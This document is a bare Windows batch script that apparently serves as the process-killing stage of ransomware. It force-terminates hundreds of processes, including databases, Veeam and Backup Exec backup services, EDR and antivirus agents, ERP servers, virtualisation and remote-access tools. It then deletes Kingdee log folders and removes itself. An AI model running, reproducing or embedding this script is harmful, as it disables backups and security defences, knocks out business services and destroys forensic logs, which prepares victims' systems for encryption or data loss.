start "killer" cmd /c "color e & @taskkill /IM sqlservr.exe /F & @taskkill /IM httpd.exe /F & @taskkill /IM java.exe /F & @taskkill /IM fdhost.exe /F & @taskkill /IM fdlauncher.exe /F & @taskkill /IM reportingservicesservice.exe /F & @taskkill /IM softmgrlite.exe /F & @taskkill /IM sqlbrowser.exe /F & @taskkill /IM ssms.exe /F & @taskkill /IM vmtoolsd.exe /F & @taskkill /IM baidunetdisk.exe /F & @taskkill /IM yundetectservice.exe /F & @taskkill /IM ssclient.exe /F & @taskkill /IM GNAupdaemon.exe /F & @taskkill /IM RAVCp164.exe /F & @taskkill /IM igfxEM.exe /F & @taskkill /IM igfxHK.exe /F & @taskkill /IM igfxTray.exe /F & @taskkill /IM 360bdoctor.exe /F & @taskkill /IM GNCEFExternal.exe /F & @taskkill /IM PrivacyIconClient.exe /F & @taskkill /IM UIODetect.exe /F & @taskkill /IM AutoDealService.exe /F & @taskkill /IM IDDAService.exe /F & @taskkill /IM EnergyDataService.exe /F & @taskkill /IM MPService.exe /F & @taskkill /IM TransMain.exe /F & @taskkill /IM DAService.exe /F & @taskkill /IM GoogleCrashHandler.exe /F & @taskkill /IM GoogleCrashHandler64.exe /F & @taskkill /IM GoogleUpdate.exe /F & @taskkill /IM cohernece.exe /F & @taskkill /IM vmware-tray.exe /F & @taskkill /IM MsDtsSrvr.exe /F & @taskkill /IM msmdsrv.exe /F & @taskkill /IM "FileZilla server.exe" /F & @taskkill /IM UpdateData.exe /F & @taskkill /IM WebApi.Host.exe /F & @taskkill /IM VGAuthService.exe /F & @taskkill /IM omtsreco.exe /F & @taskkill /IM TNSLSNR.exe /F & @taskkill /IM oracle.exe /F & @taskkill /IM msdtc.exe /F & @taskkill /IM mmc.exe /F & @taskkill /IM emagent.exe /F & @taskkill /IM SoftMgrLite.exe /F & @taskkill /IM UIODetect.exe /F & @taskkill /IM AutoDealService.exe /F & @taskkill /IM Admin.exe /F & @taskkill /IM IDDAService.exe /F & @taskkill /IM EnergyDataService.exe /F & @taskkill /IM EnterprisePortal.exe /F & @taskkill /IM MPService.exe /F & @taskkill /IM TransMain.exe /F & @taskkill /IM DAService.exe /F & @taskkill /IM tomcat7.exe /F & @taskkill /IM cohernece.exe /F & @taskkill /IM vmware-tray.exe /F & @taskkill /IM MsDtsSrvr.exe /F & @taskkill /IM Kingdee.K3.CRM.MMC.MMCService.exe /F & @taskkill /IM Kingdee.k3.Weixin.ClientService.exe /F & @taskkill /IM Kingdee.K3.PUBLIC.BkgSvcHost.exe /F & @taskkill /IM Kingdee.K3.HR.Server.exe /F & @taskkill /IM Kingdee.K3.PUBLIC.KDSvrMgrHost.exe /F & @taskkill /IM tomcat5.exe /F & @taskkill /IM Kingdee.DeskTool.exe /F & @taskkill /IM UserClient.exe /F & @taskkill /IM GNAupdaemon.exe /F & @taskkill /IM mysqld.exe /F & @taskkill /IM ImtsEventSvr.exe /F & @taskkill /IM mysqld-nt.exe /F & @taskkill /IM 360EnterpriseDiskUI.exe /F & @taskkill /IM msmdsrv.exe /F & @taskkill /IM UpdateData.exe /F & @taskkill /IM WebApi.Host.exe /F & @taskkill /IM VGAuthService.exe /F & @taskkill /IM omtsreco.exe /F & @taskkill /IM TNSLSNR.exe /F & @taskkill /IM oracle.exe /F & @taskkill /IM msdtc.exe /F & @taskkill /IM mmc.exe /F & @taskkill /IM emagent.exe /F & @taskkill /IM SoftMgrLite.exe /F & @taskkill /IM tomcat8.exe /F & @taskkill /IM QQprotect.exe /F & @taskkill /IM isqlplussvc.exe /F & @taskkill /IM nmesrvc.exe /F & @taskkill /IM mysqld.exe /F & @taskkill /IM jusched.exe /F & @taskkill /IM MtxHotPlugService.exe /F & @taskkill /IM jucheck.exe /F & @taskkill /IM wordpad.exe /F & @taskkill /IM SecureCRT.exe /F & @taskkill /IM chrome.exe /F & @taskkill /IM Thunder.exe /F"
start "killer" cmd /c "color e & @taskkill /IM ThunderPlatform.exe /F & @taskkill /IM iexplore.exe /F & @taskkill /IM vm-agent.exe /F & @taskkill /IM vm-agent-daemon.exe /F & @taskkill /IM eSightService.exe /F & @taskkill /IM cygrunsrv.exe /F & @taskkill /IM wrapper.exe /F & @taskkill /IM nginx.exe /F & @taskkill /IM node.exe /F & @taskkill /IM sshd.exe /F & @taskkill /IM vm-tray.exe /F & @taskkill /IM iempwatchdog.exe /F & @taskkill /IM sqlwriter.exe /F & @taskkill /IM php.exe /F & @taskkill /IM "notepad++.exe" /F & @taskkill /IM "phpStudy.exe" /F & @taskkill /IM OPCClient.exe /F & @taskkill /IM navicat.exe /F & @taskkill /IM SupportAssistAgent.exe /F & @taskkill /IM SunloginClient.exe /F & @taskkill /IM SOUNDMAN.exe /F & @taskkill /IM WeChat.exe /F & @taskkill /IM TXPlatform.exe /F & @taskkill /IM Tencentdll.exe /F & @taskkill /IM httpd.exe /F & @taskkill /IM jenkins.exe /F & @taskkill /IM QQ.exe /F & @taskkill /IM HaoZip.exe /F & @taskkill /IM HaoZipScan.exe /F & @taskkill /IM navicat.exe /F & @taskkill /IM TSVNCache.exe /F & @taskkill /IM RAVCpl64.exe /F & @taskkill /IM secbizsrv.exe /F & @taskkill /IM aliwssv.exe /F & @taskkill /IM Helper_Haozip.exe /F & @taskkill /IM acrotray.exe /F & @taskkill /IM "FileZilla Server Interface.exe" /F & @taskkill /IM YoudaoNote.exe /F & @taskkill /IM YNoteCefRender.exe /F & @taskkill /IM idea.exe /F & @taskkill /IM fsnotifier.exe /F & @taskkill /IM picpick.exe /F & @taskkill /IM lantern.exe /F & @taskkill /IM sysproxy-cmd.exe /F & @taskkill /IM service.exe /F & @taskkill /IM pcas.exe /F & @taskkill /IM PresentationFontCache.exe /F & @taskkill /IM RtWlan.exe /F & @taskkill /IM monitor.exe /F & @taskkill /IM Correspond.exe /F & @taskkill /IM ChatServer.exe /F & @taskkill /IM InetMgr.exe /F & @taskkill /IM LogonServer.exe /F & @taskkill /IM GameServer.exe /F & @taskkill /IM ServUAdmin.exe /F & @taskkill /IM ServUDaemon.exe /F & @taskkill /IM update0.exe /F & @taskkill /IM server.exe /F & @taskkill /IM w3wp.exe /F & @taskkill /IM notepad.exe /F & @taskkill /IM PalmInputService.exe /F & @taskkill /IM PalmInputGuard.exe /F & @taskkill /IM UpdateServer.exe /F & @taskkill /IM UpdateGate.exe /F & @taskkill /IM DBServer.exe /F & @taskkill /IM LoginGate.exe /F & @taskkill /IM SelGate.exe /F & @taskkill /IM RunGate.exe /F & @taskkill /IM M2Server.exe /F & @taskkill /IM LogDataServer.exe /F & @taskkill /IM LoginSrv.exe /F & @taskkill /IM sqlceip.exe /F & @taskkill /IM mqsvc.exe /F & @taskkill /IM RefundOrder.exe /F & @taskkill /IM ClamTray.exe /F & @taskkill /IM AdobeARM.exe /F & @taskkill /IM veeam.backup.shell.exe /F & @taskkill /IM VpxClient.exe /F & @taskkill /IM vmware-vmrc.exe /F & @taskkill /IM DSCPatchService.exe /F & @taskkill /IM scktsrvr.exe /F & @taskkill /IM ServerManager.exe /F & @taskkill /IM Dispatcher.exe /F & @taskkill /IM EFDispatcher.exe /F & @taskkill /IM sqlceip.exe /F & @taskkill /IM mqsvc.exe /F & @taskkill /IM RefundOrder.exe /F & @taskkill /IM ClamTray.exe /F & @taskkill /IM AdobeARM.exe /F & @taskkill /IM veeam.backup.shell.exe /F & @taskkill /IM VpxClient.exe /F & @taskkill /IM vmware-vmrc.exe /F & @taskkill /IM DSCPatchService.exe /F & @taskkill /IM scktsrvr.exe /F & @taskkill /IM ServerManager.exe /F & @taskkill /IM Dispatcher.exe /F & @taskkill /IM EFDispatcher.exe /F & @taskkill /IM ClamWin.exe /F & @taskkill /IM srvany.exe /F & @taskkill /IM JT_AG-8332.exe /F & @taskkill /IM XXTClient.exe /F & @taskkill /IM clean.exe /F & @taskkill /IM sqlservr.exe /F & @taskkill /IM "Net.Service.exe" /F & @taskkill /IM plsqldev.exe /F & @taskkill /IM splwow64.exe /F & @taskkill /IM Oobe.exe /F & @taskkill /IM QQYService.exe /F & @taskkill /IM sqlservr.exe /F & @taskkill /IM SGTool.exe /F & @taskkill /IM postgres.exe /F & @taskkill /IM AppVShNotify.exe /F & @taskkill /IM OfficeClickToRun.exe /F & @taskkill /IM EntDT.exe /F & @taskkill /IM EntPublish.exe /F"
start "killer" cmd /c "color e & @taskkill /IM pg_ctl.exe /F & @taskkill /IM rcrelay.exe /F & @taskkill /IM SogouImeBroker.exe /F & @taskkill /IM CCenter.exe /F & @taskkill /IM ScanFrm.exe /F & @taskkill /IM d_manage.exe /F & @taskkill /IM RsTray.exe /F & @taskkill /IM wampmanager.exe /F & @taskkill /IM RavTray.exe /F & @taskkill /IM mssearch.exe /F & @taskkill /IM sqlmangr.exe /F & @taskkill /IM msftesql.exe /F & @taskkill /IM SyncBaseSvr.exe /F & @taskkill /IM oracle.exe /F & @taskkill /IM TNSLSNR.exe /F & @taskkill /IM SyncBaseConsole.exe /F & @taskkill /IM aspnet_state.exe /F & @taskkill /IM AutoBackUpEx.exe /F & @taskkill /IM redis-server.exe /F & @taskkill /IM MySQLNotifier.exe /F & @taskkill /IM oravssw.exe /F & @taskkill /IM fppdis5.exe /F & @taskkill /IM His6Service.exe /F & @taskkill /IM dinotify.exe /F & @taskkill /IM JhTask.exe /F & @taskkill /IM Executer.exe /F & @taskkill /IM AllPassCBHost.exe /F & @taskkill /IM ap_nginx.exe /F & @taskkill /IM AndroidServer.exe /F & @taskkill /IM XT.exe /F & @taskkill /IM XTService.exe /F & @taskkill /IM AllPassMCService.exe /F & @taskkill /IM IMEDICTUPDATE.exe /F & @taskkill /IM FlashHelperService.exe /F & @taskkill /IM ap_redis-server.exe /F & @taskkill /IM UtilDev.WebServer.Monitor.exe /F & @taskkill /IM UWS.AppHost.Clr2.x86.exe /F & @taskkill /IM FoxitProtect.exe /F & @taskkill /IM ftnlses.exe /F & @taskkill /IM ftusbrdwks.exe /F & @taskkill /IM ftusbrdsrv.exe /F & @taskkill /IM ftnlsv.exe /F & @taskkill /IM Syslogd_Service.exe /F & @taskkill /IM UWS.HighPrivilegeUtilities.exe /F & @taskkill /IM ftusbsrv.exe /F & @taskkill /IM UWS.LowPrivilegeUtilities.exe /F & @taskkill /IM UWS.AppHost.Clr2.AnyCpu.exe /F & @taskkill /IM winguard_x64.exe /F & @taskkill /IM vmconnect.exe /F & @taskkill /IM UWS.AppHost.Clr2.x86.exe /F & @taskkill /IM firefox.exe /F & @taskkill /IM usbrdsrv.exe /F & @taskkill /IM usbserver.exe /F & @taskkill /IM Foxmail.exe /F & @taskkill /IM qemu-ga.exe /F & @taskkill /IM wwbizsrv.exe /F & @taskkill /IM ZTEFileTranS.exe /F & @taskkill /IM ZTEUsbIpc.exe /F & @taskkill /IM ZTEUsbIpcGuard.exe /F & @taskkill /IM AlibabaProtect.exe /F & @taskkill /IM kbasesrv.exe /F & @taskkill /IM ZTEVdservice.exe /F & @taskkill /IM MMRHookService.exe /F & @taskkill /IM extjob.exe /F & @taskkill /IM IpOverUsbSvc.exe /F & @taskkill /IM VMwareTray.exe /F & @taskkill /IM devenv.exe /F & @taskkill /IM PerfWatson2.exe /F & @taskkill /IM ServiceHub.Host.Node.x86.exe /F & @taskkill /IM ServiceHub.IdentityHost.exe /F & @taskkill /IM ServiceHub.VSDetouredHost.exe /F & @taskkill /IM ServiceHub.SettingsHost.exe /F & @taskkill /IM ServiceHub.Host.CLR.x86.exe /F & @taskkill /IM ServiceHub.RoslynCodeAnalysisService32.exe /F & @taskkill /IM ServiceHub.DataWarehouseHost.exe /F & @taskkill /IM Microsoft.VisualStudio.Web.Host.exe /F & @taskkill /IM SQLEXPRWT.exe /F & @taskkill /IM setup.exe /F & @taskkill /IM remote.exe /F & @taskkill /IM setup100.exe /F & @taskkill /IM landingpage.exe /F & @taskkill /IM WINWORD.exe /F & @taskkill /IM KuaiYun.exe /F & @taskkill /IM HwsHostPanel.exe /F & @taskkill /IM NovelSpider.exe /F & @taskkill /IM Service_KMS.exe /F & @taskkill /IM WebServer.exe /F & @taskkill /IM ChsIME.exe /F & @taskkill /IM btPanel.exe /F & @taskkill /IM Protect_2345Explorer.exe /F & @taskkill /IM Pic_2345Svc.exe /F & @taskkill /IM vmware-converter-a.exe /F & @taskkill /IM vmware-converter.exe /F & @taskkill /IM vmware.exe /F & @taskkill /IM vmware-unity-helper.exe /F & @taskkill /IM vmware-vmx.exe /F & @taskkill /IM vmware-vmx.exe /F & @taskkill /IM usysdiag.exe /F & @taskkill /IM PopBlock.exe /F & @taskkill /IM gsinterface.exe /F & @taskkill /IM Gemstar.Group.CRS.Client.exe /F & @taskkill /IM TenpayServer.exe /F & @taskkill /IM RemoteExecService.exe /F & @taskkill /IM VS_TrueCorsManager.exe /F & @taskkill /IM ntpsvr-2019-01-22-wgs84.exe /F & @taskkill /IM rtkjob-ion.exe /F & @taskkill /IM ntpsvr-2019-01-22-no-usrcheck.exe /F & @taskkill /IM NtripCaster-2019-01-08.exe /F & @taskkill /IM BACSTray.exe /F & @taskkill /IM protect.exe /F & @taskkill /IM hfs.exe /F & @taskkill /IM jzmis.exe /F & @taskkill /IM NewFileTime_x64.exe /F & @taskkill /IM 2345MiniPage.exe /F & @taskkill /IM JMJ_server.exe /F & @taskkill /IM cacls.exe /F & @taskkill /IM gpsdaemon.exe /F & @taskkill /IM gpsusersvr.exe /F & @taskkill /IM gpsdownsvr.exe /F & @taskkill /IM gpsstoragesvr.exe /F & @taskkill /IM gpsdataprocsvr.exe /F & @taskkill /IM gpsftpd.exe /F & @taskkill /IM gpsmysqld.exe /F & @taskkill /IM gpstomcat6.exe /F & @taskkill /IM gpsloginsvr.exe /F & @taskkill /IM gpsmediasvr.exe /F & @taskkill /IM gpsgatewaysvr.exe /F & @taskkill /IM gpssvrctrl.exe /F & @taskkill /IM zabbix_agentd.exe /F"
start "killer" cmd /c "color e & @taskkill /IM BackupExec.exe /F & @taskkill /IM Att.exe /F & @taskkill /IM mdm.exe /F & @taskkill /IM BackupExecManagementService.exe /F & @taskkill /IM bengine.exe /F & @taskkill /IM benetns.exe /F & @taskkill /IM beserver.exe /F & @taskkill /IM pvlsvr.exe /F & @taskkill /IM bedbg.exe /F & @taskkill /IM beremote.exe /F & @taskkill /IM beremote.exe /F & @taskkill /IM beremote.exe /F & @taskkill /IM beremote.exe /F & @taskkill /IM RemoteAssistProcess.exe /F & @taskkill /IM BarMoniService.exe /F & @taskkill /IM GoodGameSrv.exe /F & @taskkill /IM BarCMService.exe /F & @taskkill /IM TsService.exe /F & @taskkill /IM GoodGame.exe /F & @taskkill /IM BarServerView.exe /F & @taskkill /IM IcafeServicesTray.exe /F & @taskkill /IM BsAgent_0.exe /F & @taskkill /IM ControlServer.exe /F & @taskkill /IM DisklessServer.exe /F & @taskkill /IM DumpServer.exe /F & @taskkill /IM NetDiskServer.exe /F & @taskkill /IM PersonUDisk.exe /F & @taskkill /IM service_agent.exe /F & @taskkill /IM SoftMemory.exe /F & @taskkill /IM BarServer.exe /F & @taskkill /IM RtkNGUI64.exe /F & @taskkill /IM Serv-U-Tray.exe /F & @taskkill /IM QQPCSoftTrayTips.exe /F & @taskkill /IM SohuNews.exe /F & @taskkill /IM Serv-U.exe /F & @taskkill /IM QQPCRTP.exe /F & @taskkill /IM EasyFZS.exe /F & @taskkill /IM HaoYiShi.exe /F & @taskkill /IM HysMySQL.exe /F & @taskkill /IM wtautoreg.exe /F & @taskkill /IM ispiritPro.exe /F & @taskkill /IM CAService.exe /F & @taskkill /IM XAssistant.exe /F & @taskkill /IM TrustCA.exe /F & @taskkill /IM GEUU20003.exe /F & @taskkill /IM CertMgr.exe /F & @taskkill /IM eSafe_monitor.exe /F & @taskkill /IM MainExecute.exe /F & @taskkill /IM FastInvoice.exe /F & @taskkill /IM SoftMgrLite.exe /F & @taskkill /IM sesvc.exe /F & @taskkill /IM ScanFileServer.exe /F & @taskkill /IM Nuoadehgcgcd.exe /F & @taskkill /IM OpenFastAssist.exe /F & @taskkill /IM FastInvoiceAssist.exe /F & @taskkill /IM Nuoadfaggcje.exe /F & @taskkill /IM OfficeUpdate.exe /F & @taskkill /IM atkexComSvc.exe /F & @taskkill /IM FileTransferAgent.exe /F & @taskkill /IM MasterReplicatorAgent.exe /F & @taskkill /IM CrmAsyncService.exe /F & @taskkill /IM CrmAsyncService.exe /F & @taskkill /IM CrmUnzipService.exe /F & @taskkill /IM NscAuthService.exe /F & @taskkill /IM ReplicaReplicatorAgent.exe /F & @taskkill /IM ASMCUSvc.exe /F & @taskkill /IM OcsAppServerHost.exe /F & @taskkill /IM RtcCdr.exe /F & @taskkill /IM IMMCUSvc.exe /F & @taskkill /IM DataMCUSvc.exe /F & @taskkill /IM MeetingMCUSvc.exe /F & @taskkill /IM QmsSvc.exe /F & @taskkill /IM RTCSrv.exe /F & @taskkill /IM pnopagw.exe /F & @taskkill /IM NscAuth.exe /F & @taskkill /IM Microsoft.ActiveDirectory.WebServices.exe /F & @taskkill /IM DistributedCacheService.exe /F & @taskkill /IM c2wtshost.exe /F & @taskkill /IM Microsoft.Office.Project.Server.Calculation.exe /F & @taskkill /IM schedengine.exe /F & @taskkill /IM Microsoft.Office.Project.Server.Eventing.exe /F & @taskkill /IM Microsoft.Office.Project.Server.Queuing.exe /F & @taskkill /IM WSSADMIN.EXE /F & @taskkill /IM hostcontrollerservice.exe /F & @taskkill /IM noderunner.exe /F & @taskkill /IM OWSTIMER.EXE /F & @taskkill /IM wsstracing.exe /F & @taskkill /IM mssearch.exe /F & @taskkill /IM MySQLInstallerConsole.exe /F & @taskkill /IM EXCEL.EXE /F & @taskkill /IM consent.exe /F & @taskkill /IM RtkAudioService64.exe /F & @taskkill /IM RAVBg64.exe /F & @taskkill /IM FNPLicensingService64.exe /F & @taskkill /IM VisualSVNServer.exe /F & @taskkill /IM MotionBoard57.exe /F & @taskkill /IM MotionBoardRCService57.exe /F & @taskkill /IM LPManService.exe /F & @taskkill /IM RaRegistry.exe /F & @taskkill /IM RaAutoInstSrv.exe /F & @taskkill /IM RtHDVCpl.exe /F & @taskkill /IM DefenderDaemon.exe /F & @taskkill /IM BestSyncApp.exe /F & @taskkill /IM ApUI.exe /F & @taskkill /IM AutoUpdate.exe /F & @taskkill /IM LPManNotifier.exe /F & @taskkill /IM FieldAnalyst.exe /F & @taskkill /IM TimingGenerate.exe /F & @taskkill /IM Detector.exe /F & @taskkill /IM Estimator.exe /F & @taskkill /IM FA_Logwriter.exe /F & @taskkill /IM TrackingSrv.exe /F & @taskkill /IM cbInterface.exe /F & @taskkill /IM EnterprisePortal.exe /F & @taskkill /IM ccbService.exe /F & @taskkill /IM monitor.exe /F & @taskkill /IM U8DispatchService.exe /F & @taskkill /IM dbsrv16.exe /F & @taskkill /IM sqlservr.exe /F & @taskkill /IM KICManager.exe /F & @taskkill /IM KICMain.exe /F & @taskkill /IM ServerManagerLauncher.exe /F & @taskkill /IM TbossGate.exe /F & @taskkill /IM iusb3mon.exe /F & @taskkill /IM MgrEnvSvc.exe /F & @taskkill /IM Mysoft.Config.WindowsService.exe /F & @taskkill /IM Mysoft.UpgradeService.UpdateService.exe /F & @taskkill /IM hasplms.exe /F & @taskkill /IM Mysoft.Setup.InstallService.exe /F & @taskkill /IM Mysoft.UpgradeService.Dispatcher.exe /F & @taskkill /IM Mysoft.DataCenterService.WindowsHost.exe /F & @taskkill /IM Mysoft.DataCenterService.DataCleaning.exe /F & @taskkill /IM Mysoft.DataCenterService.DataTracking.exe /F & @taskkill /IM Mysoft.SchedulingService.WindowsHost.exe /F & @taskkill /IM ServiceMonitor.exe /F & @taskkill /IM Mysoft.SchedulingService.ExecuteEngine.exe /F & @taskkill /IM AgentX.exe /F & @taskkill /IM host.exe /F & @taskkill /IM AutoUpdate.exe /F & @taskkill /IM vsjitdebugger.exe /F"
start "killer" cmd /c "color e & @taskkill /IM VBoxSDS.exe /F & @taskkill /IM mysqld.exe /F & @taskkill /IM TeamViewer_Service.exe /F & @taskkill /IM TeamViewer.exe /F & @taskkill /IM CasLicenceServer.exe /F & @taskkill /IM tv_w32.exe /F & @taskkill /IM tv_x64.exe /F & @taskkill /IM rdm.exe /F & @taskkill /IM SecureCRT.exe /F & @taskkill /IM SecureCRTPortable.exe /F & @taskkill /IM VirtualBox.exe /F & @taskkill /IM VBoxSVC.exe /F & @taskkill /IM VirtualBoxVM.exe /F & @taskkill /IM abs_deployer.exe /F & @taskkill /IM edr_monitor.exe /F & @taskkill /IM sfupdatemgr.exe /F & @taskkill /IM ipc_proxy.exe /F & @taskkill /IM edr_agent.exe /F & @taskkill /IM edr_sec_plan.exe /F & @taskkill /IM sfavsvc.exe /F & @taskkill /IM DataShareBox.ShareBoxMonitorService.exe /F & @taskkill /IM DataShareBox.ShareBoxService.exe /F & @taskkill /IM Jointsky.CloudExchangeService.exe /F & @taskkill /IM Jointsky.CloudExchange.NodeService.ein /F & @taskkill /IM perl.exe /F & @taskkill /IM java.exe /F & @taskkill /IM emagent.exe /F & @taskkill /IM TsServer.exe /F & @taskkill /IM AppMain.exe /F & @taskkill /IM easservice.exe /F & @taskkill /IM Kingdee6.1.exe /F & @taskkill /IM QyKernel.exe /F & @taskkill /IM QyFragment.exe /F & @taskkill /IM UserClient.exe /F & @taskkill /IM GNCEFExternal.exe /F & @taskkill /IM GNCEFExternal.exe /F & @taskkill /IM GNCEFExternal.exe /F & @taskkill /IM ComputerZTray.exe /F & @taskkill /IM ComputerZService.exe /F & @taskkill /IM ClearCache.exe /F & @taskkill /IM ProLiantMonitor.exe /F & @taskkill /IM ChsIME.exe /F & @taskkill /IM bugreport.exe /F & @taskkill /IM GNWebServer.exe /F & @taskkill /IM UI0Detect.exe /F & @taskkill /IM GNCore.exe /F & @taskkill /IM gnwayDDNS.exe /F & @taskkill /IM GNWebHelper.exe /F & @taskkill /IM php-cgi.exe /F & @taskkill /IM ESLUSBService.exe /F & @taskkill /IM CQA.exe /F & @taskkill /IM Kekcoek.pif /F & @taskkill /IM Tinuknx.exe /F & @taskkill /IM servers.exe /F & @taskkill /IM ping.exe /F & @taskkill /IM TianHeng.exe /F & @taskkill /IM K3MobileService.exe /F & @taskkill /IM VSSVC.exe /F & @taskkill /IM Xshell.exe /F & @taskkill /IM XshellCore.exe /F & @taskkill /IM FNPLicensingService.exe /F & @taskkill /IM XYNTService.exe /F & @taskkill /IM U8DispatchService.exe /F & @taskkill /IM EISService.exe /F & @taskkill /IM UFSoft.U8.Framework.EncryptManager.exe /F & @taskkill /IM yonyou.u8.gc.taskmanager.servicebus.exe /F & @taskkill /IM U8KeyManagePool.exe /F & @taskkill /IM U8MPool.exe /F & @taskkill /IM U8SCMPool.exe /F & @taskkill /IM UFIDA.U8.Report.SLReportService.exe /F & @taskkill /IM U8TaskService.exe /F & @taskkill /IM U8TaskWorker.exe /F & @taskkill /IM U8WebPool.exe /F & @taskkill /IM U8AllAuthServer.exe /F & @taskkill /IM UFIDA.U8.UAP.ReportService.exe /F & @taskkill /IM UFIDA.U8.ECE.UTU.Services.exe /F & @taskkill /IM U8WorkerService.exe /F & @taskkill /IM UFIDA.U8.ECE.UTU.exe /F & @taskkill /IM ShellStub.exe /F & @taskkill /IM U8UpLoadTask.exe /F & @taskkill /IM UfSysHostingService.exe /F & @taskkill /IM UFIDA.UBF.SystemManage.ApplicationService.exe /F & @taskkill /IM UFIDA.U9.CS.Collaboration.MailService.exe /F & @taskkill /IM NotificationService.exe /F & @taskkill /IM UBFdevenv.exe /F & @taskkill /IM UFIDA.U9.SystemManage.SystemManagerClient.exe /F & @taskkill /IM mongod.exe /F & @taskkill /IM SpusCss.exe /F & @taskkill /IM UUDesktop.exe /F & @taskkill /IM KDHRServices.exe /F & @taskkill /IM Kingdee.K3.PUBLIC.BkgSvcHost.exe /F & @taskkill /IM Kingdee.K3.HR.Server.exe /F & @taskkill /IM Kingdee.K3.Mobile.Servics.exe /F & @taskkill /IM Kingdee.K3.PUBLIC.KDSvrMgrHost.exe /F & @taskkill /IM KDSvrMgrService.exe /F & @taskkill /IM pdfServer.exe /F & @taskkill /IM pdfspeedup.exe /F & @taskkill /IM SufAppServer.exe /F & @taskkill /IM tomcat5.exe /F & @taskkill /IM Kingdee.K3.Mobile.LightPushService.exe /F & @taskkill /IM iMTSSvcMgr.exe /F & @taskkill /IM kdmain.exe /F & @taskkill /IM KDActMGr.exe /F & @taskkill /IM Kingdee.DeskTool.exe /F & @taskkill /IM K3ServiceUpdater.exe /F & @taskkill /IM Aua.exe /F & @taskkill /IM iNethinkSQLBackup.exe /F & @taskkill /IM auaJW.exe /F & @taskkill /IM Scheduler.exe /F & @taskkill /IM bschJW.exe /F & @taskkill /IM SystemTray64.exe /F & @taskkill /IM OfficeDaemon.exe /F & @taskkill /IM OfficeIndex.exe /F & @taskkill /IM OfficeIm.exe /F & @taskkill /IM iNethinkSQLBackupConsole.exe /F & @taskkill /IM OfficeMail.exe /F & @taskkill /IM OfficeTask.exe /F & @taskkill /IM OfficePOP3.exe /F & @taskkill /IM apache.exe /F & @taskkill /IM GnHostService.exe /F /T & @taskkill /IM HwUVPUpgrade.exe /F /T & @taskkill /IM "Kingdee.KIS.UESystemSer.exe" /F /T & @taskkill /IM uvpmonitor.exe /F /T & @taskkill /IM UVPUpgradeService.exe /F /T & @taskkill /IM KDdataUpdate.exe /F /T & @taskkill /IM Portal.exe /F /T & @taskkill /IM U8SMSSrv.exe /F /T & @taskkill /IM "Ufida.T.SM.PublishService.exe" /F /T & @taskkill /IM lta8.exe /F /T & @taskkill /IM UfSvrMgr.exe /F /T & @taskkill /IM AutoUpdateService.exe /F /T & @taskkill /IM MOM.exe /F /T"

cls

rd /s /q "C:\Program Files (x86)\Kingdee\K3ERP\K3Express\KDHRAPP\client\log"
rd /s /q "C:\Program Files\Kingdee\K3ERP\K3Express\Logs"

DEL %0 /q .exe /F

